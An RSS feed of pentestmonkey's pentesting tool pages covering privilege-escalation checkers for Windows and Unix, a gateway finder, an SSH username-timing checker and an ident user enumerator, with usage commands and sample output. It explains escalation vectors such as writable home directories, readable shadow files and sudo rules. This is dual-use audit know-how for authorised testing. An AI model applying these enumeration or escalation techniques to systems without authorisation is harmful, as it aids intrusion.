<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>Tools &#8211; pentestmonkey</title>
	<atom:link href="https://pentestmonkey.net/category/tools/feed" rel="self" type="application/rss+xml" />
	<link>https://pentestmonkey.net</link>
	<description>Taking the monkey work out of pentesting</description>
	<lastBuildDate>Sun, 20 Jan 2013 00:10:15 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=5.8.3</generator>
	<item>
		<title>windows-privesc-check</title>
		<link>https://pentestmonkey.net/tools/windows-privesc-check</link>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Tue, 20 Dec 2011 06:04:27 +0000</pubDate>
				<category><![CDATA[Audit]]></category>
		<category><![CDATA[Tools]]></category>
		<category><![CDATA[audit]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[windows]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=541</guid>

					<description><![CDATA[A long time ago, I started writing a tool to look for local privilegeÂ escalationÂ vectorsÂ on Windows systems &#8211; e.g. weak permissions on files, directories, service registy keys. Â I never quite got round to finishing it, but the project could still be useful to pentesters and auditors in its current part-finished state. I&#8217;d suggest giving it a [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>A long time ago, I started writing a tool to look for <a href="http://code.google.com/p/windows-privesc-check/wiki/DesignGoals">local privilegeÂ escalationÂ vectors</a>Â on Windows systems &#8211; e.g. weak permissions on files, directories, service registy keys. Â I never quite got round to finishing it, but the project could still be useful to pentesters and auditors in its current part-finished state.</p>
<p>I&#8217;d suggest giving it a try next time you do a security audit with local administrator rights, or next time you get a non-admin logon to a Windows system during a pentest. Â It was designed to be useful for both.</p>
<p><a href="http://code.google.com/p/windows-privesc-check/source/browse/#svn%2Ftrunk">Trunk</a> contains the best all-round version. It checks some file, directory, registry and service permissions (among other things). Â Reports are in HTML.</p>
<p>The newer <a href="http://code.google.com/p/windows-privesc-check/source/browse/#svn%2Fbranches%2Fwpc-2.0">wpc-2.0 branch</a> does a better job at auditing Windows services &#8211; but does little else. Â Reports are in text only.</p>
<p>You only need to download the .exe file. Full source code is available too, though. Â It&#8217;s written in Python, uses <a href="http://sourceforge.net/projects/pywin32/files/pywin32/">pywin32</a>Â and &#8220;compiled&#8221; with <a href="http://www.pyinstaller.org/">pyinstaller</a>. You don&#8217;t need to download any dependencies (even python) unless you&#8217;re planning to <a href="http://code.google.com/p/windows-privesc-check/wiki/BuildingTheExecutable">build the .exe yourself</a>.</p>
<h2>FAQ</h2>
<h3>Why 2 versions?</h3>
<p>The code in &#8220;trunk&#8221; wasn&#8217;t object-oriented, making it harder to work with. Â I rewrote it to create the &#8220;wpc-2.0&#8221; branch. Much better &#8211; but alas, not finished.</p>
<h3>Can I see the source code?</h3>
<p>Yes, it&#8217;s on <a href="http://code.google.com/p/windows-privesc-check/source/browse/">google code</a> along with the executables.</p>
<h3>Will the program elevate privileges for me?</h3>
<p>No. Â It gives you a report describing any potential vulnerabilities it finds, but doesn&#8217;t have any autopwn features. Â This is mostly to reduce the risk of my codeÂ accidentallyÂ breaking your client&#8217;s system <img src="https://s.w.org/images/core/emoji/13.1.0/72x72/1f642.png" alt="ðŸ™‚" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>gateway-finder</title>
		<link>https://pentestmonkey.net/tools/gateway-finder</link>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sun, 09 Oct 2011 16:02:38 +0000</pubDate>
				<category><![CDATA[Misc]]></category>
		<category><![CDATA[Tools]]></category>
		<category><![CDATA[discovery]]></category>
		<category><![CDATA[gateway]]></category>
		<category><![CDATA[network]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[tool]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=520</guid>

					<description><![CDATA[Gateway-finder is a scapy script that will help you determine which of the systems on the local LAN has IP forwarding enabled and which can reach the Internet. This can be useful during Internal pentests when you want to quickly check for unauthorised routes to the Internet (e.g. rogue wireless access points)Â or routes to other [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>Gateway-finder is a <a href="http://www.secdev.org/projects/scapy/">scapy</a> script that will help you determine which of the systems on the local LAN has IP forwarding enabled and which can reach the Internet.</p>
<p>This can be useful during Internal pentests when you want to quickly check for unauthorised routes to the Internet (e.g. rogue wireless access points)Â or routes to other Internal LANs. Â It doesn&#8217;t perform a hugely thorough check, but it is quick at least. Â It&#8217;s python, so it should be easy to modify if you need it to do something moreÂ sophisticated.</p>
<h3>Download</h3>
<p><a href="https://github.com/pentestmonkey/gateway-finder">https://github.com/pentestmonkey/gateway-finder</a></p>
<p><span class="Apple-style-span" style="color: #000000; font-size: 17px; line-height: 25px;">Overview</span></p>
<p>You give the script the IP address of a system on the Internet you&#8217;re trying to reach and it will send the following probes via each system on the local LAN:</p>
<ul>
<li>An ICMP Ping</li>
<li>A TCP SYN packet to port 80</li>
<li>An ICMP Ping with a TTL of 1</li>
<li>A TCP SYN packet to port 80 with a TTL of 1</li>
</ul>
<p>It will report separately which systems send an ICMP &#8220;TTL exceeded in transit&#8221; message back (indicating that they&#8217;re routers) and which respond to the probe (indicating that they&#8217;re gateways to the Internet).</p>
<h3>Dependencies</h3>
<p>Python and Scapy. Â On Debian / Ubuntu you should just need to do this:</p>
<pre># apt-get install python-scapy</pre>
<h3>Usage</h3>
<pre># python gateway-finder.py -h
Usage: gateway-finder.py [ -I interface ] -i ip -f macs.txt

Tries to find a layer-3 gateway to the Internet.  Attempts to reach an IP
address using ICMP ping and TCP SYN to port 80 via each potential gateway
in macs.txt (ARP scan to find MACs)

Options:
  -h, --help            show this help message and exit
  -i IP, --ip=IP        Internet IP to probe
  -v, --verbose         Verbose output
  -I INTERFACE, --interface=INTERFACE
                        Network interface to use
  -f MACFILE, --macfil=MACFILE
                        File containing MAC addresses</pre>
<h3>Step 1: Run an ARP scan to identify systems on the local LAN</h3>
<p>Use your favourite ARP scanning to identify systems on the local LAN. Save the output (I use to arp.txt in the example below).</p>
<pre># arp-scan -l | tee arp.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.6: 256 hosts scanned in 2.099 seconds (121.96 hosts/sec).  3 responded</pre>
<h3>Step 2: Run gateway-finder on the list of local systems</h3>
<p>Gateway-finder needs two bits of input from you:</p>
<ul>
<li>The MAC addresses of the potential gateways</li>
<li>The IP address of a system on the Internet (I use a google.com address in the example below):</li>
</ul>
<p>If arp.txt also contains an IP of each system on the same line as the MAC, you&#8217;ll get much nicer output. Â If you need to use a different network interface, use the -I option.</p>
<pre># python gateway-finder.py -f arp.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder

[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in arp.txt
[+] 00:13:72:09:AD:76 [10.0.0.100] appears to route ICMP Ping packets to 209.85.227.99.  Received ICMP TTL Exceeded in transit response.
[+] 00:13:72:09:AD:76 [10.0.0.100] appears to route TCP packets 209.85.227.99:80.  Received ICMP TTL Exceeded in transit response.
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] Done</pre>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>timing-attack-checker</title>
		<link>https://pentestmonkey.net/tools/timing-attack-checker</link>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sun, 25 Sep 2011 15:39:22 +0000</pubDate>
				<category><![CDATA[Misc]]></category>
		<category><![CDATA[Tools]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[perl]]></category>
		<category><![CDATA[tool]]></category>
		<category><![CDATA[userenumeration]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=595</guid>

					<description><![CDATA[timing-attack-checker is a simple PERL script that helps you check for timing attacks. The most common form of timing attack I&#8217;ve noticed while pentesting is that the server may take longer to respond to a valid username than to an invalid username. Â This can be handy for bruteforcing a list of valid usernames. Â I&#8217;ll work [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>timing-attack-checker is a simple PERL script that helps you check for timing attacks.</p>
<p>The most common form of timing attack I&#8217;ve noticed while pentesting is that the server may take longer to respond to a valid username than to an invalid username. Â This can be handy for bruteforcing a list of valid usernames. Â I&#8217;ll work through an example of such an attack below.</p>
<p>The script could also be used to test other types of timing attack. Â It should provide microsecond-resolution timing.</p>
<p>In its simplest form, you give it two commands you want it to record the execution time of. Â It will run those commands 100 times (by default), recording how long it takes.</p>
<pre style="font-family: 'Courier 10 Pitch', Courier, monospace; color: #222222; line-height: 21px; font: normal normal normal 12px/18px Consolas, Monaco, monospace; background-image: initial; background-attachment: initial; background-origin: initial; background-clip: initial; background-color: #f7f7f7; margin-bottom: 24px; font-size: 15px; background-position: initial initial; background-repeat: initial initial; padding: 1.5em;">timing-attack-check.pl 'login.pl -u knownuser -p x' 'login.pl -u notexist -p x'</pre>
<p>The data is optionally saved in tab-delimited format for import into a spreadsheet. Â Some raw stats are also output to help you decide if you&#8217;ve found a timing attack or not.</p>
<h3>Download</h3>
<p>Get the latest version from <a href="https://github.com/pentestmonkey/timing-attack-checker">github</a></p>
<h3>Usage</h3>
<pre>timing-attack-checker v1.0 http://pentestmonkey.net/tools/timing-attack-checker

Usage: timing-attack-check.pl [ options ] 'cmd1' 'cmd2' ['cmd3' ...]

options are:
  -n N      Number of times to run the commands
  -o file   File to write tab delimited data to

Example:
  timing-attack-check.pl 'login.pl -u knownuser -p x' 'login.pl -u notexist -p x'</pre>
<h3>Dependencies</h3>
<ul>
<li>PERL</li>
<li>Linux (because I use /dev/null for some output)</li>
<li>Time::HiRes module (probably installed by default &#8211; it is on Ubuntu 11.04)</li>
</ul>
<h3>Worked Example</h3>
<p>I set up an SSH server that only allowed logins using keys, not passwords. Â I wanted to know if the server would take longer to respond to a login attempt for a valid username than for an invalid username &#8211; presumably it does less work if the username is invalid. Â I load an SSH key into my ssh-agent so that the SSH client offers it to the server for each login attempt.</p>
<p>I used the following usernames for testing:</p>
<ul>
<li>&#8220;x&#8221; the name of an account that exists. Â It also has an ~/.ssh/authorized_keys file</li>
<li>&#8220;y&#8221; the name of a non-existent account.</li>
<li>&#8220;z&#8221; the name of an account that exists. Â It has no ~/.ssh/authorized_keys file</li>
</ul>
<p>I had an ssh-agent running that had one key loaded. Â The key was not authorised to log into any account on the target system:</p>
<pre>$ ssh-keygen -f key1
$ eval `ssh-agent`
$ ssh-add key1</pre>
<p>I ran the following command to make 40 login attempts for each:</p>
<pre>$ timing-attack-checker.pl -o data.txt -n 40 'ssh x@host' 'ssh y@host' 'ssh z@host'</pre>
<p>The script output the following:</p>
<pre>[D] Running command: ssh x@host
[D] Command took 0.464256 secs
[D] Running command: ssh y@host
[D] Command took 0.115495 secs
[D] Running command: ssh z@host
[D] Command took 0.128768 secs
[D] Running command: ssh x@host
[D] Command took 0.125885 secs
[D] Running command: ssh y@host
... snip ...
=================================================
Results for: ssh x@host
Average time: 0.143035425
Minimum time: 0.10777
Maximum time: 0.464256
Standard deviation: 0.0608662980593068 (i.e. 68% of times within 1 sd, 95% within 2 sd)
Was fastest on 3 out of 40 occassions (7.5% of the time)
Was slowest on 10 out of 40 occassions (25% of the time)
=================================================
Results for: ssh y@host
Average time: 0.120723175
Minimum time: 0.095311
Maximum time: 0.206071
Standard deviation: 0.0171279751063684 (i.e. 68% of times within 1 sd, 95% within 2 sd)
Was fastest on 36 out of 40 occassions (90% of the time)
Was slowest on 3 out of 40 occassions (7.5% of the time)
=================================================
Results for: ssh z@host
Average time: 0.132942175
Minimum time: 0.114824
Maximum time: 0.154482
Standard deviation: 0.00611497853997666 (i.e. 68% of times within 1 sd, 95% within 2 sd)
Was fastest on 1 out of 40 occassions (2.5% of the time)
Was slowest on 27 out of 40 occassions (67.5% of the time)
=================================================
[+] Saving tab-delimited data to data.txt</pre>
<p>There are a lot of stats there. Â Let&#8217;s discuss each in turn an see if it leads us to believe that there&#8217;s a username enumeration issue:</p>
<ul>
<li>Average time: This ranges from about 0.12 secs to 0.14 secs. Â That&#8217;s a difference of more than 10%. Â It&#8217;s alsoÂ comparableÂ to a standard deviation (depending which of the 3 you use). Â It could be random noise caused by the laggy wireless network I ran it over. Â &#8220;x&#8221; looks pretty slow. Â &#8220;y&#8221; looks pretty fast.</li>
<li>Min/Max time: The min and max times for each login attempt would ideally be very similar. Â We see that for some usernames the max is 2x or 4x higher than the min. Â This shows we might have a choppy network connection. Â Or maybe the client or server is busy. Â This min/max helps to show the consistency (or otherwise) of the data collected. Â Our samples aren&#8217;t particularly consistent.</li>
<li><a href="http://en.wikipedia.org/wiki/Standard_deviation">Standard Deviation</a>: How close our samples are to the average. Â If themin/max of your sample set are similar and the difference between average login time for &#8220;x&#8221; and &#8220;y&#8221; (say) is more than 2 standard deviations, I think you can be pretty sure you&#8217;ve found a timing attack. Â That doesn&#8217;t apply to the data we collected here (more like 1 sd).</li>
<li>Fastest/Slowest: Shows how consistently a command was the fastest/slowest in its round. Â This can be useful for busy network/hosts if you can assume that all attempts will be slowed down consistently by network/host problems. Â Logins were faster for &#8220;y&#8221; on 90% attempts, compared to the 33% you&#8217;d expect if no timing attack was present. Â This seems quite compelling evidence that we can detect accounts that don&#8217;t exist &#8211; remember &#8220;y&#8221; doesn&#8217;t exist.</li>
</ul>
<p>So in conclusion, it seems that it would be possible to bruteforce a list of usernames that exist on the server tested. Â If anyone wants to look further into this issue, I&#8217;ve included details on my config at the end of this post.</p>
<p>More generally, you&#8217;ll probably want to run only two commands, not three or more. Â The option is there if you need it, though.</p>
<h3>Notes on SSH Server Config</h3>
<p>OS: Ubuntu 11.04</p>
<p>SSH Daemon:Â OpenSSH_5.8p1 (package:Â openssh-server 1:5.8p1-1ubuntu3)</p>
<p>Changes to default /etc/ssh/sshd_config:</p>
<pre>PasswordAuthentication no
Port 12345</pre>
<p>CPU:Â AMD Athlon(tm) 64 X2 Dual Core Processor 5000+</p>
<p>RAM: 2GB</p>
<p>Network: Wireless connection capable of around 3.5 MB/sec</p>
<p>Server was idle during testing.</p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>Bootparamd Client for Linux</title>
		<link>https://pentestmonkey.net/tools/misc/bootparamd-client-for-linux</link>
					<comments>https://pentestmonkey.net/tools/misc/bootparamd-client-for-linux#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sun, 02 Nov 2008 21:11:50 +0000</pubDate>
				<category><![CDATA[Misc]]></category>
		<category><![CDATA[bootparamd]]></category>
		<category><![CDATA[linux]]></category>
		<category><![CDATA[tool]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=117</guid>

					<description><![CDATA[See this blog post for download link and installation instructions.]]></description>
										<content:encoded><![CDATA[<p>See this <a href="http://pentestmonkey.net/blog/nis-domain-name/">blog post</a> for download link and installation instructions.</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/tools/misc/bootparamd-client-for-linux/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Rexd Client For Linux</title>
		<link>https://pentestmonkey.net/tools/misc/rexd-client-for-linux-2</link>
					<comments>https://pentestmonkey.net/tools/misc/rexd-client-for-linux-2#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sat, 01 Nov 2008 12:56:53 +0000</pubDate>
				<category><![CDATA[Misc]]></category>
		<category><![CDATA[linux]]></category>
		<category><![CDATA[rexd]]></category>
		<category><![CDATA[tool]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=116</guid>

					<description><![CDATA[Full details about &#8220;on&#8221;, the rexd client can be found on this blog post.]]></description>
										<content:encoded><![CDATA[<p>Full details about &#8220;on&#8221;, the rexd client can be found on this <a href="http://pentestmonkey.net/blog/rexd-client-for-linux/">blog post</a>.</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/tools/misc/rexd-client-for-linux-2/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>ident-user-enum</title>
		<link>https://pentestmonkey.net/tools/user-enumeration/ident-user-enum</link>
					<comments>https://pentestmonkey.net/tools/user-enumeration/ident-user-enum#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sat, 06 Sep 2008 18:54:08 +0000</pubDate>
				<category><![CDATA[User Enumeration]]></category>
		<category><![CDATA[identuserenum]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[tool]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=107</guid>

					<description><![CDATA[ident-user-enum is a simple PERL script to query the ident service (113/TCP) in order to determine the owner of the process listening on each TCP port of a target system. This can help to prioritise target service during a pentest (you might want to attack services running as root first).Â  Alternatively, the list of usernames [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>ident-user-enum is a simple PERL script to query the ident service (113/TCP) in order to determine the owner of the process listening on each TCP port of a target system.</p>
<p>This can help to prioritise target service during a pentest (you might want to attack services running as root first).Â  Alternatively, the list of usernames gathered can be used for password guessing attacks on other network services.</p>
<p><span id="more-107"></span></p>
<h2>Download</h2>
<p><a href="http://pentestmonkey.net/tools/ident-user-enum/ident-user-enum-1.0.tar.gz">ident-user-enum v1.0 tar ball</a></p>
<h2>Install</h2>
<p>The INSTALL file in the distribution tarball contains the instructions you need to get up and running:</p>
<pre>$ cat INSTALL</pre>
<pre>1. Install the dependencies</pre>
<pre>Install PERL using your package manager.</pre>
<pre>Install the following PERL modules:
* IO::Socket::INET
* Net::Ident</pre>
<pre>These may be available through your package manager.Â  If not, then
install them from CPAN:
# perl -MCPAN -e shell
# install IO::Socket::INET
# install Net::Ident</pre>
<pre>2. "Install" ident-user-enum.pl</pre>
<pre>It's just a PERL script, so no installation is necessary, but probably
want to copy it into your path and set appropriate permissions:
# install -o root -m 0755 ident-user-enum.pl /usr/local/bin/</pre>
<h2>Running</h2>
<pre>$ ./ident-user-enum.pl 10.0.0.1 21 80 113 443
ident-user-enum v1.0 ( http://pentestmonkey.net/tools/ident-user-enum )</pre>
<pre>10.0.0.1:21Â Â Â  &lt;unknown&gt;
10.0.0.1:80Â Â Â  www-run
10.0.0.1:113Â Â  root
10.0.0.1:443Â  www-run</pre>
<p>Note that some ident services lie, e.g. return &#8220;nobody&#8221; for all services.Â  This is good from a security perspective, but bad for you as a pentester.</p>
<p>You should only get an &#8220;&lt;unknown&gt;&#8221; response if the target port is closed or firewalled.</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/tools/user-enumeration/ident-user-enum/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>unix-privesc-check</title>
		<link>https://pentestmonkey.net/tools/audit/unix-privesc-check</link>
					<comments>https://pentestmonkey.net/tools/audit/unix-privesc-check#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Fri, 01 Feb 2008 21:19:26 +0000</pubDate>
				<category><![CDATA[Audit]]></category>
		<category><![CDATA[audit]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[tool]]></category>
		<category><![CDATA[unixprivesccheck]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=109</guid>

					<description><![CDATA[Unix-privesc-checker is a script that runs on Unix systems (tested on Solaris 9, HPUX 11, Various Linuxes, FreeBSD 6.2).Â  It tries to find misconfigurations that could allow local unprivilged users to escalate privileges to other users or to access local apps (e.g. databases). It is written as a single shell script so it can be [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>Unix-privesc-checker is a script that runs on Unix systems (tested on Solaris 9, HPUX 11, Various Linuxes, FreeBSD 6.2).Â  It tries to find misconfigurations that could allow local unprivilged users to escalate privileges to other users or to access local apps (e.g. databases).</p>
<p>It is written as a single shell script so it can be easily uploaded and run (as opposed to un-tarred, compiled and installed).Â  It can run either as a normal user or as root (obviously it does a better job when running as root because it can read more files).</p>
<p>&nbsp;</p>
<p><span id="more-109"></span></p>
<h2>Download</h2>
<p>unix-privesc-check v1.4 can be downloaded <a href="/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz">here</a>.Â  (Version 1.1 is <a href="/tools/unix-privesc-check/unix-privesc-check.gz">here</a> if you still need it).</p>
<p>Update: The <a href="http://code.google.com/p/unix-privesc-check/source/checkout">google code SVN</a> is more up to date.</p>
<h2>Usage</h2>
<p>The download is gzip&#8217;d, so gunzip it.Â  Upload it to the server you&#8217;re auditing / pentesting then just run it:</p>
<pre>$ ./unix-privesc-check &gt; output.txt</pre>
<p>The output&#8217;s a bit messy (it&#8217;s hard to be neat with shell scripts), so you&#8217;re probably best to save the output and search it for the word &#8216;WARNING&#8217;.Â  If you don&#8217;t see the word &#8216;WARNING&#8217; then the script didn&#8217;t find anything.Â  Example:</p>
<pre>$ ./unix-privesc-check</pre>
<pre>Starting unix-privesc-check v1.0 ( http://pentestmonkey.net/tools/unix-privesc-check )

This script checks file permissions and other settings that could allow
local users to escalate privileges.

Use of this script is only permitted on systems which you have been granted
legal permission to perform a security assessment of.Â  Apart from this
condition the GPL v2 applies.

Search the output below for the word 'WARNING'.Â  If you don't see it then
this script didn't find any problems.

Assuming the OS is: linux

############################################
Checking if external authentication is allowed in /etc/passwd
############################################
No +:... line found in /etc/passwd

############################################
Checking nsswitch.conf for addition authentication methods
############################################
Neither LDAP nor NIS are used for authentication</pre>
<pre>... lots more output ...</pre>
<h2>What&#8217;s the Intended usage of user-privesc-checker?</h2>
<p>It&#8217;s intended to be run by security auditors and pentetration testers against systems they have been engaged to assess, and also by system admnisitrators who want to check for &#8220;obvious&#8221; misconfigurations.Â  It can even be run as a cron job so you can check regularly for misconfigurations that might be introduced.</p>
<p>I wanted to write something that was at least partially useful to pentetration testers when they gained access to a low-privilege account and wanted to escalate privileges.Â  There are lots of things that pentesters will check in this situation and one of the most tedious to check is weak file permissions &#8211; this of often one of the most fruitful, though, so there&#8217;s no avoiding it.</p>
<p>Disclaimer: Running this script alone isn&#8217;t a substitute for proper audit (e.g. following one of the NSA&#8217;s excellent <a href="http://www.nsa.gov/snac/downloads_all.cfm">configuration guides</a>).Â  There are lots of possibilities for escalation that are just too hard to audit using a script.Â  This script is intended to be a shortcut, not a replacement for a proper audit.Â  See the &#8220;Limitations&#8221; section below for lots of examples of areas not covered by this script.</p>
<h2>So this is a Unix Audit Script?</h2>
<p>Not in the traditional sense.Â  &#8220;Unix Audit&#8221; means different things to different people.Â  I understand it to mean checking a whole array of configuration settings including:</p>
<ul>
<li>Security patches (i.e. that they&#8217;ve been applied)</li>
<li>Cracking passwords to check for weak ones</li>
<li>IP Stack configuration (no unnecessary IPv6, no IP Forwarding, etc.)</li>
<li>Weak file permissions (reading sensitive data, modifiying sensitive files)</li>
<li>Configuration of local applications (reviewing sshd_config, httpd.conf)</li>
<li>Other best-practise stuff (remote logging, no insecure protocols, paranoid mount options)</li>
</ul>
<p>So, no it&#8217;s not an audit script in this sense.Â  It doesn&#8217;t set out to do all these things.Â  It checks for a subset of these which relate directly to privilege escalation.Â  It focusses mainly on generic techniques: common misconfigurations and weak file permissions.Â  It doesn&#8217;t check for missing patches, however this is difficult to check &#8220;on-box&#8221; using a single shell script.Â  Checkout <a href="http://pentestmonkey.net/tools/exploit-suggester/">exploit-suggester</a> if you&#8217;re interested in doing this &#8220;off-box&#8221;..</p>
<h2>Why Another Auditing Script?</h2>
<p>There are lots of scripts out there that will perform a local security audit for you (<a href="http://www.nongnu.org/tiger/">Tiger</a> and <a href="http://usat.sourceforge.net/">LSAT</a> are good examples).Â  Some hoover data so you can analyse it offline, others will analyse it too and present you a nice report.Â  These have their place and I&#8217;ll continue to use them.Â  However&#8230;</p>
<p>I haven&#8217;t found one that gives me a quick list of obvious attack vectors which is written as a single shell script (I hate shell scripts too, but it I wanted a script that would run on virtually any Unix system).</p>
<p>I therefore decided to write unix-privesc-audit to focus on finding misconfigurations that can actually be exploited as opposed to finding all the usual best-practise stuff.</p>
<h2>Some Vulnerabilities Introduced Through Weak File Permissions</h2>
<p>Below is a list of the checks performed by the script.Â  Note that whenever it checks file permissions, it also checks the permissions on the parent directories.Â  When it finds a group-writable file or directory it only flags an issue if that group has more than one non-root member.</p>
<h3>Writable Home Directories</h3>
<p>If you can write to someone&#8217;s home directory, you could add a .rhosts file or .ssh/authorized_keys file and log in right away; or alter one of the login scripts (e.g. .bash_profile) and have them create an SUID shell when they log in.Â  There are lots of problems if home directories are writable.</p>
<p>The script flags a warning if any home directories are writable by anyone other than the owner or root.</p>
<h3>Readable /etc/shadow</h3>
<p>Not so common these days, but could allow you to read password hashes, crack them then log in as other users.</p>
<p>This script checks if the shadow file is readable by non-root users.Â  If it can read the shadow file, it also performs some other checks (see below).</p>
<h3>Weak Permissions On Cron Jobs</h3>
<p>Cron jobs are normally listed in /etc/crontab and /var/spool/cron/crontabs/.Â  Cron jobs can be run by any user.Â  This script check if cron jobs run programs that can be modified by users other than root and the user the job runs as.</p>
<h3>Writable Configuration Files</h3>
<p>Programs that are run as root are listed in lots of files (/etc/init.d/*, /etc/inetd.conf, /etc/xinetd.d/*, etc.)Â  If any of these files are writable by non-root users, this script will flag a warning.</p>
<h3>Writable Device Files</h3>
<p>This script checks that device files corresponding to currently mounted file systems (e.g. /dev/sda1) aren&#8217;t writable.Â  I doubt this happens very often to be honest, but it doesn&#8217;t hurt to check.</p>
<h3>Readable Files In Home Directories</h3>
<p>There can be lots of interesting things in home directories, but this script checks for files that contain passwords (.netrc, .my.cnf) and ACLs (.rhosts, .ssh/*).Â  If readable these can provide a way access local applications or other local user accounts.</p>
<h3>Running Processes Correspond To Writable Programs</h3>
<p>This script does a &#8220;ps&#8221; listing, attempts to determine the full path of each program running and check if it can be modified by anyone other than the user it&#8217;s running as and root.</p>
<h2>Other Stuff Not Related With File Permissions</h2>
<p>The script also performs a couple of other checks related to privilege escalation, but not related to file permissions:</p>
<h3>Sudo Configuration</h3>
<p>Sudo is one of the most obvious ways to escalate privileges if it&#8217;s enabled.Â  Sometimes only certain commands can be run, sometimes any command can be run.</p>
<p>If /etc/sudoers is readable, this script checks if it&#8217;s being used, lists which users can use sudo and which ones can use it without a password.</p>
<h3>Accounts with no Password</h3>
<p>If /etc/shadow is readable, the script lists any accounts without passwords.</p>
<h2>How useful is unix-privesc-check in practise?</h2>
<p>It depends largely on the base OS and the amount of configuration an administrator has done (more configuration = more chance of mistakes).Â  If you run it against a fairly modern OS (e.g. Linux, Solaris 9/10) that hasn&#8217;t had much configuration done, then you&#8217;re not going to find much.Â  These OSs have faily secure file permissions by default.Â  However, if you run it against Solaris 8 or against a system that has been running for a couple of years and had a lot of configuration done or 3rd party apps installed, then you&#8217;ll probably find quite a bit.</p>
<p>I&#8217;m ashamed to say that I found a couple of serious misconfigurations in my own Linux box when I ran this script!</p>
<h2>Limitations</h2>
<p>Currently only the stuff above is checked.Â  None of the other &#8220;traditional audit&#8221; stuff is checked.Â  There are also some obvious privilege escalation tactics regarding file permissions which are too hard to script up (for me at least).Â  This list acts as a list of limitations / inspiration for manual testing / working TODO list:</p>
<ul>
<li>Actually reading shell scripts, finding that they call then checking the file permissions on called programs (e.g. seeing /etc/init.d scripts call anything in an insecure way, checking shell scripts that are run a login time)</li>
<li>Checking the PATHs for users then looking for insecure programs within those directories</li>
<li>Polling &#8220;ps&#8221; to identify processes that don&#8217;t run very often and checking that the program being run has secure file permissions.</li>
<li>Checking for non-standard programs with the SUID bit set</li>
<li>Checking arguments of currently running processes (e.g. if a process runs as root and had &#8220;/dir/somefile.conf&#8221; as an argument it would be worth checking the perms on that file).</li>
<li>It doesn&#8217;t parse shell script names, perl script names or any other kind of script name from the process listing.Â  It just checks /bin/sh and /usr/bin/perl normally. Â  This is a pretty big limitation actually at the moment.Â  It a process is called &#8220;/bin/sh /tmp/dodgy-n-writable.sh&#8221; it&#8217;s probably worth investigating).</li>
<li>It doesn&#8217;t check the permissions of shared object files for each running process.Â  This info is availalable in /proc/pid/maps, /proc/pid/smaps on Linux at least, so this feature may follow shorty.</li>
<li>It doesn&#8217;t check the permissions on open files.Â  Again this info is available on Linux at least in /proc/pid/fd/, so this feature may follow shortly.</li>
<li>Doesn&#8217;t report /etc/hosts.equiv trust relationships.</li>
<li>No checks for NFS mounts / exports.Â Â  These are a common source of insecurity.</li>
<li>Doesn&#8217;t check stuff run from inittab.</li>
</ul>
<p>Yeah, lots and lots of limitations, so make sure you do a manual audit too. <img src="https://s.w.org/images/core/emoji/13.1.0/72x72/1f642.png" alt="ðŸ™‚" class="wp-smiley" style="height: 1em; max-height: 1em;" /> I hope this script saves you some time, though.</p>
]]></content:encoded>
					
